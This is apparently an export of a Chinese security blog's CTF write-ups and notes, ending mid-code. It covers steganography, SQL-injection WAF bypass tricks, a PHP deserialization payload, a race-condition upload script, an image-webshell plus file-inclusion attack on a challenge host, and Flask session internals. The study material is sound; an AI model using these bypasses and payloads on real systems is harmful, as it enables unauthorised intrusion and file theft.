<p>通过扫描二维码得到：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">Useful_Massage_1</span><span class="params">(SVNDQyU3QmZsQGdfaXN)</span></span></span><br></pre></td></tr></table></figure></div>
<p>en<del>en</del>en~<br>我这个英语废物也知道这个message拼错了。。。。<br>然后尝试去base64解码了一下    </p>
<p>得到一部分flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">ISCC&#123;<span class="symbol">fl@</span>g_is</span><br></pre></td></tr></table></figure></div>

<p>然后再找另一部分，就从分离出来的另一张图片着手    </p>
<p>再用stegSolve摩擦了一遍Dio。这里因为感觉图片的名字有点问题，所以尝试使用Data Extract功能   </p>
<p><img src="https://i.imgur.com/HvGIMz3.png" alt=""></p>
<p>左边一大部分主要是讲了RGBA（Alpha是透明度）的颜色通道</p>
<p>为了方便理解我们分开说</p>
<p>RGB是红绿蓝 但他们的值代表的实际上是亮度</p>
<p>R的数字越大，则代表红色亮度越高；R的数字越小，则代表红色亮度越低。G，B同理</p>
<p>R的亮度各有256个级别，GB同理。即从0到255，合计为256个。从数字0到255的逐渐增高，我们人眼观察到的就是亮度越来越大，红色、绿色或蓝色越来越亮。然而256是2的8次方 所以你会看见上图的7~0  一共8个通道</p>
<p>而Alpha就是透明度 该通道用256级灰度来记录图像中的透明度信息，定义透明、不透明和半透明区域</p>
<p>alpha的值为0就是全透明，alpha 的值为 255 则表示不透明</p>
<p>因此左半部分就理解了</p>
<p>右半部分就是Extra By(额外的)和Bit Order（位顺序）和Bit Plane Order（位平面的顺序）</p>
<p>1）.Extra By(额外的)：分为row（行）和column（纵）</p>
<p>   每个像素用R，G，B三个分量表示，那么一张图片就像一个矩阵，矩阵的每个单位就是（0<del>255，0</del>255，0~255）</p>
<p>   也就会有是纵排列和行排列了，一般事先访问行再访问列（如果相反会引起ve使用方法）</p>
<p>￼2）.Bit Order（位顺序）:MSB是一串数据的最高位，LSB是一串数据的最低位。   </p>
<p><img src="https://i.imgur.com/Upln9YJ.png" alt="">   </p>
<p>尝试了几次就成功得到第二个信息   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ISBL"><figure class="iseeu highlight /isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">Useful_M</span> <span class="function"><span class="title">assage_2</span>(<span class="variable">fa09fTjBfRCUyMW9fZGFhYWElMjFfXyU3RA</span>==)</span></span><br></pre></td></tr></table></figure></div>

<p>然后这里其实是将两个message拼接然后base64解码得到flag   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">ISCC&#123;fl<span class="title">@g_is_kO_N0_D</span><span class="title">!o_daaaa</span><span class="title">!__</span>&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>CTF</category>
        <category>杂项</category>
        <category>PNG图片隐写</category>
      </categories>
      <tags>
        <tag>png图片隐写</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入绕过</title>
    <url>/undefined/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="1-WAF相关介绍"><a href="#1-WAF相关介绍" class="headerlink" title="1.WAF相关介绍"></a>1.WAF相关介绍</h2><p>WAF(web应用防火墙)   </p>
<h3 id="WAF有哪些类："><a href="#WAF有哪些类：" class="headerlink" title="WAF有哪些类："></a>WAF有哪些类：</h3><ul>
<li>1.软件型WAF</li>
<li>2.硬件型WAF</li>
<li>3.云WAF<br>反向代理模式工作，通过配置NS记录或者CNAME记录     </li>
<li>网站系统内置的WAF<br>waf的功能：<br>1.审计<br>2.访问控制/过滤<br>3.web加固<br>WAF怎么识别扫描器<br>1.AWVS,SQLMAP,APPscan,OpenVAS等工具<br>以下几个点来识别waf   <pre><code>1.扫描器指纹（head字段/请求的参数值）      
2.单IP+cookie某一个时间段出发多少次来判断       
3.隐藏链接标签     
...   </code></pre></li>
</ul>
<p>对于注入过程当中如何去判断目标是否有WAF<br>1.sqlmap -u url地址 –identity-waf –batch<br>2.手工判断<br>xxx.com/?user=a’ union select 1,2,3 –+<br>放入一个不存在的参数去触发waf防护；触发形式：页面无法访问，响应码异常，返回提示</p>
<h2 id="2-SQL注入绕过"><a href="#2-SQL注入绕过" class="headerlink" title="2.SQL注入绕过"></a>2.SQL注入绕过</h2><ul>
<li>黑名单过滤：空格，/，,‘,and,or,union,select,sleep(),”,#,-,+,limit等   </li>
<li>一：双写绕过</li>
<li>二：大小写绕过</li>
<li>三：编码绕过    </li>
</ul>
<p>1.base64<br>2.ASCII<br>3.宽字符<br>4.url编码<br>5.Unicode编码<br>…….</p>
<ul>
<li>四：替换关键字<br>id=1 UNIunionON SEselectLECT 1,2,3    </li>
<li>五：注释绕过<br>空格通过注释来代替   /**/<br>空格通过()来代替     </li>
</ul>
]]></content>
      <categories>
        <category>WEB安全漏洞</category>
        <category>SQL注入漏洞</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC | Php is the best language</title>
    <url>/undefined/%5BISCC%5DPhp%20is%20the%20best%20language/</url>
    <content><![CDATA[<p>首先拿到题目下载文件得到源码：<br><img src="https://i.imgur.com/LwHKfwo.png" alt=""></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;</span><br><span class="line">            <span class="keyword">if</span> (base64_encode(file_get_contents($filename)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> base64_encode(file_get_contents($filename));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    $url=<span class="string">'./index.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$html=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'test'</span>]))&#123;</span><br><span class="line">    $s = $_POST[<span class="string">'test'</span>];</span><br><span class="line">    $html.=<span class="string">"&lt;p&gt;谢谢参与!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure></div>
<p>unserialize()反序列化函数，确定为反序列化题目<br>直接构造序列化函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php">@error_reporting(<span class="number">1</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (base64_encode(file_get_contents($filename)))</span></span><br><span class="line"><span class="php">            &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> base64_encode(file_get_contents($filename));</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $data = $_GET[<span class="string">'data'</span>];</span></span><br><span class="line"><span class="php">        $good = unserialize($data);</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $good;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> </span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $url=<span class="string">'./index.php'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">//创建一个对象，进行file属性赋值，然后序列化对象。</span></span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> baby();</span></span><br><span class="line"><span class="php">$a-&gt;file = <span class="string">"flag.php"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> (serialize($a));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>
<p>运行得到序列化字符   </p>
<p><img src="https://i.imgur.com/AeHsSbo.png" alt=""></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"baby"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"file"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>再将得到的序列化字符串通过get(‘data’)传入例题。通过反序列化输出flag.php的文件信息   </p>
<p><img src="https://i.imgur.com/rwPwaDi.png" alt=""></p>
<p>base64解码得到flag   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOHOTKEY"><figure class="iseeu highlight /autohotkey"><table><tr><td class="code"><pre><span class="line">flag&#123;u_r_really_<span class="built_in">a_php</span>_expert&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>WEB安全漏洞</category>
        <category>反序列化漏洞</category>
      </categories>
      <tags>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>条件竞争漏洞</title>
    <url>/undefined/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="什么是条件竞争漏洞"><a href="#什么是条件竞争漏洞" class="headerlink" title="什么是条件竞争漏洞"></a>什么是条件竞争漏洞</h3><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>假设有这么一个代码，实现用户上传图片功能</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))&#123;</span></span><br><span class="line"><span class="php">    copy($_GET[<span class="string">'src'</span>],$_GET[<span class="string">'dst'</span>]);</span></span><br><span class="line"><span class="php">    <span class="comment">//...</span></span></span><br><span class="line"><span class="php">    <span class="comment">//check file</span></span></span><br><span class="line"><span class="php">    unlink($_GET[<span class="string">'dst'</span>]);</span></span><br><span class="line"><span class="php">    <span class="comment">//...</span></span></span><br><span class="line"><span class="php"> &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>
<p>该代码中通过</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOCKERFILE"><figure class="iseeu highlight /dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">copy</span><span class="bash">(<span class="variable">$_GET</span>[<span class="string">'src'</span>],<span class="variable">$_GET</span>[<span class="string">'dst'</span>])</span></span><br></pre></td></tr></table></figure></div>
<p>将上传的文件从源地址转换到目的地址进行储存。    </p>
<p>然后通过中间一系列 check file 代码，检查文件的安全性，如果发现该文件为不安全文件则使用 unlink 删除该文件。 但是如果判断时间过长，在该不安全文件被判定性质并且删除之前执行了该文件则会导致系统漏洞的形成。</p>
<h3 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h3><p>攻击者上传了一个用来生成恶意 shell 的文件，在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意 shell 的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个 shell 文件，后续的一切就都不是问题了。</p>
<h3 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h3><p>调整没有字典的爆破，不断发包<br><img src="https://i.imgur.com/PUIHvpe.png" alt="">   </p>
<p>然后设置发送三千个数据包，然后设置线程调至50<br><img src="https://i.imgur.com/5jNUoV8.png" alt="">   </p>
<p>第一个包为以50线程迅速上传三千次，<br>第二个包为以50线程迅速访问三千次，只要速度够快就可以访问到。<br>然后开始爆破成功得到flag，我们可以看到也不是百分百可以得到flag，存在竞争.<br><img src="https://i.imgur.com/iFtWUUx.png" alt="">   </p>
<p>也可以使用burpsuit发包+条件竞争脚本</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PROPERTIES"><figure class="iseeu highlight /properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">import</span> <span class="string">requests</span></span><br><span class="line"></span><br><span class="line"><span class="attr">url</span> = <span class="string">'http://202.119.201.199/challenge/web/uploadfile/upload/index.phtml'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">req</span> = <span class="string">requests.Session()</span></span><br><span class="line"></span><br><span class="line"><span class="attr">while</span> <span class="string">True:</span></span><br><span class="line">	<span class="attr">ans</span> = <span class="string">req.get(url)</span></span><br><span class="line">	<span class="attr">web_content</span> = <span class="string">ans.content</span></span><br><span class="line"></span><br><span class="line">	<span class="attr">if</span> <span class="string">'flag' in web_content:</span></span><br><span class="line">		<span class="attr">print</span> <span class="string">web_content</span></span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>WEB安全漏洞</category>
        <category>条件竞争漏洞</category>
      </categories>
      <tags>
        <tag>条件竞争漏洞 | CTF | 文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP函数笔记</title>
    <url>/undefined/PHP%E5%87%BD%E6%95%B0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos() 函数"></a>strpos() 函数</h3><p>查找字符串在另一个字符串中首次出现的位置</p>
<h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">var_dump(strpos(<span class="string">'开始23测试ceshi'</span>, <span class="string">'测试'</span>));</span></span><br><span class="line"><span class="php"><span class="comment">//输出int(8)</span></span></span><br><span class="line"><span class="php"><span class="comment">//strpos 按字节处理，UTF-8一个汉字占3个字节</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>
<hr>
<h3 id="mb-strpos-函数"><a href="#mb-strpos-函数" class="headerlink" title="mb_strpos 函数"></a>mb_strpos 函数</h3><p>查找字符串在另一个字符串中首次出现的位置</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">var_dump(mb_strpos(<span class="string">'开始23测试ceshi'</span>, <span class="string">'测试'</span>));、</span><br><span class="line">                    <span class="number">0</span> <span class="number">1</span> <span class="number">234</span></span><br><span class="line"><span class="comment">//输出int(4)</span></span><br><span class="line">mb_strpos 按字处理</span><br></pre></td></tr></table></figure></div>
<hr>
<h3 id="mb-substr函数"><a href="#mb-substr函数" class="headerlink" title="mb_substr函数"></a>mb_substr函数</h3><p>mb_substr() 函数返回字符串的一部分，substr() 函数只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。</p>
<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> mb_substr(<span class="string">"菜鸟教程"</span>, <span class="number">0</span>, <span class="number">2</span>);</span></span><br><span class="line"><span class="php"><span class="comment">// 输出：菜鸟</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<h3 id="copy函数"><a href="#copy函数" class="headerlink" title="copy函数"></a>copy函数</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">copy</span><span class="params">()</span></span> 函数拷贝文件。   </span><br><span class="line"><span class="function"><span class="title">copy</span><span class="params">(source,destination)</span></span>   </span><br><span class="line">source------------------------必需。规定要复制的文件。</span><br><span class="line">destination-------------------必需。规定复制文件的目的地。</span><br></pre></td></tr></table></figure></div>

<h3 id="strchr-函数"><a href="#strchr-函数" class="headerlink" title="strchr()函数"></a>strchr()函数</h3><p>查找 “world” 在 “Hello world!” 中的第一次出现，并返回此字符串的其余部分：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> strchr(<span class="string">"Hello world!"</span>,<span class="string">"world"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<h3 id="file-put-contents-函数"><a href="#file-put-contents-函数" class="headerlink" title="file_put_contents()函数"></a>file_put_contents()函数</h3><p>函数把一个字符串写入文件中。</p>
<p><strong>语法：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">int file_put_contents ( string <span class="variable">$filename</span> , mixed <span class="variable">$data</span> [, int <span class="variable">$flags</span> = 0 [,<span class="built_in"> resource </span><span class="variable">$context</span> ]] )</span><br></pre></td></tr></table></figure></div>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">file</td>
<td align="left">必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。</td>
</tr>
<tr>
<td align="left">data</td>
<td align="left">必需。规定要写入文件的数据。可以是字符串、数组或数据流。</td>
</tr>
<tr>
<td align="left">mode</td>
<td align="left">可选。规定如何打开/写入文件。可能的值：FILE_USE_INCLUDE_PATHFILE_APPENDLOCK_EX</td>
</tr>
<tr>
<td align="left">context</td>
<td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP函数</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC | What can images do</title>
    <url>/undefined/%5BISCC%5DWhat%20can%20images%20do/</url>
    <content><![CDATA[<h3 id="首先查看题目"><a href="#首先查看题目" class="headerlink" title="首先查看题目"></a>首先查看题目</h3><p><img src="https://i.imgur.com/VStF8zR.png" alt="">   </p>
<p>尝试上传.php一句话   </p>
<p>如图：   </p>
<p><img src="https://i.imgur.com/ARa54YO.png" alt="">   </p>
<p>尝试抓包更改文件名后缀名   </p>
<p><img src="https://i.imgur.com/T0bYjsP.png" alt="">   </p>
<p>尝试大小写绕过，00截断之后无果，猜测是对文件内容进行了检测。   </p>
<p>尝试使用图片马绕过   </p>
<p><img src="https://i.imgur.com/vIk0ccQ.png" alt="">   </p>
<p>上传成功图片马   </p>
<p>尝试使用apache解析漏洞连接蚁剑失败   </p>
<p>后来得知使用文件包含   </p>
<p><img src="https://i.imgur.com/pcnqgCY.png" alt="">    </p>
<p>下面的图片存在文件包含漏洞   </p>
<p>payload：   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">101.201</span>.<span class="number">126.95</span>:<span class="number">7004</span>/?filename=../uploads/<span class="number">2020</span>/<span class="number">05</span>/<span class="number">07</span>/<span class="number">6432185</span>eb<span class="number">384</span><span class="keyword">c</span><span class="number">2</span><span class="keyword">c</span><span class="number">07</span>a<span class="number">8631382360</span>.jpg&amp;submit=<span class="symbol">%E6</span><span class="symbol">%8</span>F<span class="symbol">%90</span><span class="symbol">%E4</span><span class="symbol">%BA</span><span class="symbol">%A4</span></span><br></pre></td></tr></table></figure></div>
<p>蚁剑连接得到flag<br><img src="https://i.imgur.com/gZQRTOW.png" alt=""></p>
]]></content>
      <categories>
        <category>WEB安全漏洞</category>
        <category>文件上传漏洞</category>
      </categories>
      <tags>
        <tag>图片马绕过 | 文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>客户端 session 导致的安全问题</title>
    <url>/undefined/%E5%AE%A2%E6%88%B7%E7%AB%AF%20session%20%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>在Web中，session是认证用户身份的凭证，它具备如下几个特点：  </p>
<ul>
<li>1.用户不可以任意篡改</li>
<li>2.A用户的session无法被B用户获取   </li>
</ul>
<p>也就是说，session的设计目的是为了做用户身份认证。但是，很多情况下，session被用作了别的用途，将产生一些安全问题，我们今天就来谈谈“客户端session”（client session）导致的安全问题。</p>
<h2 id="什么是客户端session"><a href="#什么是客户端session" class="headerlink" title="什么是客户端session"></a>什么是客户端session</h2><p>在传统PHP开发中，$_SESSION变量的内容默认会被保存在服务端的一个文件中，通过一个叫“PHPSESSID”的Cookie来区分用户。这类session是“服务端session”，用户看到的只是session的名称（一个随机字符串），其内容保存在服务端。   </p>
<p>然而，并不是所有语言都有默认的session存储机制，也不是任何情况下我们都可以向服务器写入文件。所以，很多Web框架都会另辟蹊径，比如Django默认将session存储在数据库中，而对于flask这里并不包含数据库操作的框架，就只能将session存储在cookie中。   </p>
<p>因为cookie实际上是存储在客户端（浏览器）中的，所以称之为“客户端session”。   </p>
<h2 id="保护客户端session"><a href="#保护客户端session" class="headerlink" title="保护客户端session"></a>保护客户端session</h2><p>将session存储在客户端cookie中，最重要的就是解决session不能被篡改的问题。  </p>
<p>我们看看flask是如何处理的：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">class SecureCookieSessionInterface(SessionInterface):</span><br><span class="line">    <span class="string">""</span><span class="string">"The default session interface that stores sessions in signed cookies</span></span><br><span class="line"><span class="string">    through the :mod:`itsdangerous` module.</span></span><br><span class="line"><span class="string">    "</span><span class="string">""</span></span><br><span class="line">    #: the salt that should be applied on top of the<span class="built_in"> secret </span>key <span class="keyword">for</span> the</span><br><span class="line">    #: signing of cookie based sessions.</span><br><span class="line">    salt = <span class="string">'cookie-session'</span></span><br><span class="line">    #: the hash function <span class="keyword">to</span> use <span class="keyword">for</span> the signature. The<span class="built_in"> default </span>is sha1</span><br><span class="line">    digest_method = staticmethod(hashlib.sha1)</span><br><span class="line">    #: the name of the itsdangerous supported key derivation. The default</span><br><span class="line">    #: is hmac.</span><br><span class="line">    key_derivation = <span class="string">'hmac'</span></span><br><span class="line">    #: A python serializer <span class="keyword">for</span> the payload. The<span class="built_in"> default </span>is a compact</span><br><span class="line">    #: JSON derived serializer with support <span class="keyword">for</span> some extra Python types</span><br><span class="line">    #: such as datetime objects <span class="keyword">or</span> tuples.</span><br><span class="line">    serializer = session_json_serializer</span><br><span class="line">    session_class = SecureCookieSession</span><br><span class="line"></span><br><span class="line">    def get_signing_serializer(self, app):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> app.secret_key:</span><br><span class="line">            return None</span><br><span class="line">        signer_kwargs = dict(</span><br><span class="line">            <span class="attribute">key_derivation</span>=self.key_derivation,</span><br><span class="line">            <span class="attribute">digest_method</span>=self.digest_method</span><br><span class="line">        )</span><br><span class="line">        return URLSafeTimedSerializer(app.secret_key, <span class="attribute">salt</span>=self.salt,</span><br><span class="line">                                      <span class="attribute">serializer</span>=self.serializer,</span><br><span class="line">                                      <span class="attribute">signer_kwargs</span>=signer_kwargs)</span><br><span class="line"></span><br><span class="line">    def open_session(self, app, request):</span><br><span class="line">        s = self.get_signing_serializer(app)</span><br><span class="line">        <span class="keyword">if</span> s is None:</span><br><span class="line">            return None</span><br><span class="line">        val = request.cookies.<span class="builtin-name">get</span>(app.session_cookie_name)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> val:</span><br><span class="line">            return self.session_class()</span><br><span class="line">        max_age = total_seconds(app.permanent_session_lifetime)</span><br><span class="line">        try:</span><br><span class="line">            data = s.loads(val, <span class="attribute">max_age</span>=max_age)</span><br><span class="line">            return self.session_class(data)</span><br><span class="line">        except BadSignature:</span><br><span class="line">            return self.session_class()</span><br><span class="line"></span><br><span class="line">    def save_session(self, app, session, response):</span><br><span class="line">        domain = self.get_cookie_domain(app)</span><br><span class="line">        path = self.get_cookie_path(app)</span><br><span class="line">        # Delete case. <span class="keyword">If</span> there is <span class="literal">no</span> session we bail early.</span><br><span class="line">        # <span class="keyword">If</span> the session was modified <span class="keyword">to</span> be empty we <span class="builtin-name">remove</span> the</span><br><span class="line">        # whole cookie.</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session:</span><br><span class="line">            <span class="keyword">if</span> session.modified:</span><br><span class="line">                response.delete_cookie(app.session_cookie_name,</span><br><span class="line">                                       <span class="attribute">domain</span>=domain, <span class="attribute">path</span>=path)</span><br><span class="line">            return</span><br><span class="line">        # Modification case. There are upsides <span class="keyword">and</span> downsides <span class="keyword">to</span></span><br><span class="line">        # emitting a set-cookie header each request. The behavior</span><br><span class="line">        # is controlled by the :meth:`should_set_cookie` method</span><br><span class="line">        # which performs a quick check <span class="keyword">to</span> figure out <span class="keyword">if</span> the cookie</span><br><span class="line">        # should be <span class="builtin-name">set</span> <span class="keyword">or</span> <span class="keyword">not</span>. This is controlled by the</span><br><span class="line">        # SESSION_REFRESH_EACH_REQUEST<span class="built_in"> config </span>flag as well as</span><br><span class="line">        # the permanent flag on the session itself.</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.should_set_cookie(app, session):</span><br><span class="line">            return</span><br><span class="line">        httponly = self.get_cookie_httponly(app)</span><br><span class="line">        secure = self.get_cookie_secure(app)</span><br><span class="line">        expires = self.get_expiration_time(app, session)</span><br><span class="line">        val 